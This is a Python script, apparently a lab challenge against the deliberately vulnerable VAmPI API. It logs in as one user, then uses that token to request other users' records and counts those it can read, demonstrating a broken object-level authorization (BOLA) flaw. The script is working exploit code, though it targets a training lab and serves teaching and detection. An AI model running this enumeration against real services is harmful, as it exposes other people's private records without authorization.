#!/usr/bin/env python3
"""
vampi_challenge_02_bola_users.py — Broken Object Level Access on users.

A legitimate user logs in and views their OWN record (baseline). Then, using
the same valid session, we request OTHER users' records (GET /users/v1/{other}).
VAmPI does not check the token's owner, so any authenticated caller can read
any user — the BOLA detection pattern.
Run: python3 vampi_challenge_02_bola_users.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="BOLA on other users' records")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    u = vc.known_users(cfg)[0]
    own = u["username"]

    token = vc.login(base, own, u["password"], vc.consumer_headers(802), tout)
    if not token:
        print("login failed, skipping")
        return
    h = vc.auth_headers(token)

    r = requests.get(f"{base}/users/v1/{own}", headers=h, timeout=tout)
    print(f"baseline  GET /users/v1/{own} (own) -> HTTP {r.status_code}")

    others = [x["username"] for x in vc.known_users(cfg) if x["username"] != own]
    # also probe a couple of numeric-ish names in case the roster differs
    others += [o for o in ("name1", "name2", "name3") if o != own]
    exposed = 0
    for name in dict.fromkeys(others):
        r = requests.get(f"{base}/users/v1/{name}", headers=h, timeout=tout)
        foreign = r.status_code == 200 and name != own
        if foreign:
            exposed += 1
        print(f"bola      GET /users/v1/{name} (foreign) -> HTTP {r.status_code} {'[EXPOSED]' if foreign else ''}")

    print(f"\nDone — {exposed} foreign user record(s) readable by a non-owner token.")


if __name__ == "__main__":
    main()
